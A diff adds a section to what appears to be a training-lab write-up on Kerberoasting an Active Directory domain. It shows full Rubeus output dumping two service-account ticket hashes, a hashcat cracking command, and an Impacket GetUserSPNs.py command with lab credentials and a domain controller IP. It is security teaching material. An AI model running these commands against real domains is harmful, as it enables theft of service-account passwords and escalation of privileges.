@@ -476,3 +476,156 @@ Answer
 : CONTROLLER-1
 
 
+Kerberoasting with Rubeus and Impacket
+============================================================================================================================================
+
+### Overview
+
+In this task we'll be covering one of the most popular Kerberos attacks - Kerberoasting. Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.
+
+In order to perform the attack, we'll be using both Rubeus as well as Impacket so you understand the various tools out there for Kerberoasting. There are other tools out there such a kekeo and Invoke-Kerberoast but I'll leave you to do your own research on those tools.
+
+I have already taken the time to put Rubeus on the machine for you, it is located in the downloads folder.
+
+### Method 1. Kerberoasting with Rubeus
+
+**Useage**
+
+1. `Rubeus.exe kerberoast` Dumps the Kerberos hash of and kerberoastable users
+
+```
+controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe kerberoast
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. 
+
+[*] Searching the current domain for Kerberoastable users
+
+[*] Total kerberoastable users : 2
+
+
+[*] SamAccountName         : SQLService
+[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
+[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
+[*] PwdLastSet             : 5/25/2020 10:28:26 PM 
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
+                             l:30111*$71EB3D98612665B4BDEEBBBDB132EB3B$13ECA3BCD149C59D110FC5FB68E4B9607EAAA7 
+                             939594245D7C4CC393174D313AF7BCAAF8D362C562543DFA355DF910A2682FF347C46C3BF10D520D       
+                             D72F9C06C192DA88D9EEAF6543C5AA930FFA6F8F354259774BE098CCDA296D581F1D9EFB0772CE9B       
+                             3A636231E7235D411FB50AFEA675E48688F0A963C1AADC19F1DB2FF17E599AC54476BAFD3F171AD1       
+                             8D36FB37E1EDA2A26ED606922633E53D720780936DD5079C34CFE08BC9F71280E58811854D734418       
+                             88D19E6CEBD7B672E5443F1A7BB7E9B2828BB5229B383612DB7AC18C860129D58744016FE5AF3E26       
+                             EB483CA25F3685DF22EF0D3B6ED1D3AC4D1D330DD040819E10B15D945659828D3351653940D45D1B       
+                             39DE33BDBCCF97E8A16F7C802164CAAA37442241FA9BB90D1D185DF3A42A4E2DB6A92A337B33AFAC       
+                             A52E2FDA8B74B7AF3B0DE0AF1CF943AE76FFF67F735FEC24442762B04ED4CE8A8AEBB4BBB440A66D       
+                             17A5E3D284F0B3154C61058CE60A390637CDED3B5DD6482CAE58E57995934356EE9CCBF4518D126A       
+                             1496A984DEAECD6980EAC78AD22127E3675FD2B7B190344325B4E35E9564CE9334F172C6570B967A       
+                             9EC1312A16CFB04CF5A282631836F06D8EAE6E685E851F2300F48B1753C991B16C2FC66B5331F95B       
+                             7B82A37AD17B454F32B893595016D40282CE636C281416124523195ED034D4B5A6C450366FC712B4       
+                             5F4DF472CC1DC22E21C9F8769CA2CEB4165BB5F5E4A50438F57F7100088181E710F0CB0C4A68F80F       
+                             14C0BD10387265B9A9CC9AA6A2479F135948E5D47A82FC82F01C68A2A6E79DE1946CB1286A4BB43C       
+                             7FE2F3814EA2BE188FA26E2C24EACCCA53836B37F3BBDBD9C4AB4D40D3CEEAC516565DDC7820EF65       
+                             6CA0AA2CD0BEFD893188AC93507C238D976FD509CCD7B17D4340CA5B239825B7AC265A673630A74C       
+                             132FC7DFCF67C1A019DD59DDDF1EC7E079B0FED11494EC0B3BF4DC3B6DEA641A4BE92B26835301A9       
+                             8800664B0DC90437FFA4C89EB07BA101E5B12A08C15D7661A1CEC550A3E46DA67453933B19B6C5FC       
+                             47147CD8D3E0F63CCA2FBA5646D8669F017332223FC0A0CBB3AC2BA9DCCA36DA91CACACFFBBA8A3C       
+                             AAA20C793E4CCFB42FDB3F322A7DA327BE4CCAD168B6CEFCF1DC4CF006C8624CA980782B45D993DF       
+                             C2B4154C2D73012D9F1936D65944C94270E35A5411A4033144EB1BE5AAB2D75AC1A5D5FD17740EC2       
+                             1F67B319D923F4C147216610345A3388FE70E1A9D2E4F3A6B5CDC51CD34BD93100A9C6428C340832       
+                             FBB2FA446CE48510BABCCDAB10F444B31877F9D04765C932C53D133E6ECB9B118896AA0823A7526E       
+                             7203A6C987F1F92064107FF0CFEF85A9779D51D729F19569BA74649580C14200DCC0E596129D143B       
+                             FDDFEFB65D1659B85EB2915ECEE8BF1515DE6E7172FD6616534C13AD312A6F93CA69A6977E75D923       
+                             769EAA402BD5093F4872E51D8675A4961E37EA756BC920CD587A57EE5A10D8F03682FE0562B3A5BC       
+                             58CF82362F9AB07B00191F52B7BE463228BC0FBB1D85C50B53F0F5600C36860E5AE124DD42EE2923       
+                             E4AAF6A1F5180F63B5E2A6EEE6D1CDBC183E3E4C297A8D4AD95BAAE1AFBBE8A4C87B733DB202B524       
+                             251EB78F22039F5A207D8A8FF8EF6639087B5C9B47CAF0A3DF688075E9
+
+
+[*] SamAccountName         : HTTPService
+[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
+[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
+[*] PwdLastSet             : 5/25/2020 10:39:17 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo       
+                             cal:30222*$82159D47C0796C9751F32916D1B8DFE9$B887A7DDFC8B7BB4FA85317E0EAA3ADC0738       
+                             151DD6F9A81EE59C5B4B5B0C87B92525B59C9BBF465B346E1CFBDA1E452B12BC086DCB78E670DE24       
+                             B172BED57FA541325188E7F1C0D67C1BF0776C9508B860FA940DBAC9887AA1FBADD28C5E63413C92       
+                             2890F2F4A43DED59A97EB9C5686DDC32C8BF5C87DD298D6A487C1617F3F7B8091ADF9892043052AA       
+                             AC0DD90659B8218D086E0323CCAC9E8C23576F7F08BCFE4AE391D96245376D9447B08D0082712855       
+                             9C9D49CB8178521BA090CEA52CACD2CDE2DB77F4EBD9B5569C5435BE9013F4AA179FFF666EABF1FC       
+                             4804732A2FE6D81151B4C4511A878D6BD9ED82575BD8669C9A59C34D94DACA26834DF59C629FE4F9       
+                             03BC6EEC9EEABD3787234296D63A3F6E7BAA7CB8DCD31BCBA6BAFDFA781676FFDAFBCD384DC73D2D       
+                             AACBB2EBD0FAE99E0AAE07A61C7E8F0174D7414ADAFF26619F79AE51A328820B3CBCDD014143F85E       
+                             779B46FCDA4484C2DDF82A1E2A1AEE42207859B7461527591AB77178A5E8E1402832CC5911BB2CBD       
+                             571F21CEAF7BEB6F277C17C8E88C651BECA38B619E77109F4619187BED9CCB14CA06B8806C461A77       
+                             DB439D0E407727218BEF08971A29E3214FEB1D35338D88E246F4098A0472F40DC066F507E267492C       
+                             1FB94CE8951F0C67CFD4C67BAA5DF91ED73D7F6D3494B015241C080AAB9D3BC892367C2755DB85AD       
+                             AD5B9D824ACCB1DCD8446D2A0F83C46562B95FF2EF553D34E550D191A7CA9C71DADB283E3D3F5806       
+                             2C8EE9199A7C61C4FE3D6437EA7DE7D05E967BF7ADF939C276FF93F7DB95B9BBD567E665CB0CC349       
+                             3E03F7F836C0E04A22B7DEB4BB56F16B2969037DC9A5145DC002E685A5493F2406AA2B421FD18AFD       
+                             09C0B2E3342A6A580899132167E0C6BC7115C07DFA66B5389D416D662D7EDF22C2FFBD4634C82CF7       
+                             883C11A4F3EE650D22BACB0138D3399B1BAC49103D4C4C548DA34BD6178935E1B64ACEE73F4FE317       
+                             761A294D6FF6EA91E2CABC3C11E4DC5A9A0FA441A7C4BE21BC12E09FCCA6AD12599BF4006C665528       
+                             988E803C87415588377F6D22B55452DA64AE8BF02FE25FB90BBACD5B053D4C47491E18560681A6A0       
+                             36937E73176E2E0AA4137E220A8426240F2801BAE3464349C2AABABCB35308A93C9610BDCA4A5886       
+                             B41D06CECFE464A9A735762D6772AAD04ECB6E6DBC2CF329DB3D29996EADD0DE7CB6A8AFA7FBE9A3       
+                             EE9F8C8C74480791AF967F8EFC00A59DD07F4A3E7742A2FC98C708134C80DD785E9E95A6085B3EF3       
+                             C494FB3D7BB181A6678A43C478A6D43CAE80D46918502364E42880795935D90AE96F17D390AA51A4       
+                             B04D7D2105E972B161A58EAB4ED7DDE726A7167E081F5D5166AD0D031B4CE5E767922DB5E19CF9E0       
+                             C554E00D5CF7BAD12A26D6B24C8C6DC99B46B391D1B7177289F685A97542975EDADD6D51B7D96C75       
+                             927B737ECF008CCEEF6AE35CC09F497718723FD377D216AEDFD091502000D1301DCF2F37CE5C8555       
+                             70E6DF319446B721F0614648446EA0CA0C3E0369684909DC1C48126566AE879CB92A3A6EF6357139       
+                             727A151479D976D019043DDD863E37E26EF5F34E4DCF010309B6FB94C14EB0323054DD027A7C4465       
+                             4C1839218C90F109A528987DA61C57BB5DAF89794E15DE98EC4A5AA419AB
+
+
+```
+copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat
+: `hashcat -m 13100 -a 0 hash.txt Pass.txt`
+
+- `-m 13100` to set the mode
+- `-a 0`
+- `hash.txt` path to hash file
+- `Pass.txt` path to password list, this lab provides a much shorter RockYou list, saved as Pass.txt
+
+
+2. 
+
+### Method 2. Kerberoadsting with impacket
+
+Method 2 - Impacket
+
+**Impacket Installation**  
+
+Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20
+
+1.) cd /opt navigate to your preferred directory to save tools in 
+
+2.) download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19
+
+3.) cd Impacket-0.9.19 navigate to the impacket directory
+
+4.) pip install . - this will install all needed dependencies
+
+Kerberoasting w/ Impacket - 
+
+1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located
+
+2.) sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.20.101 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
+
+3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash
+
+
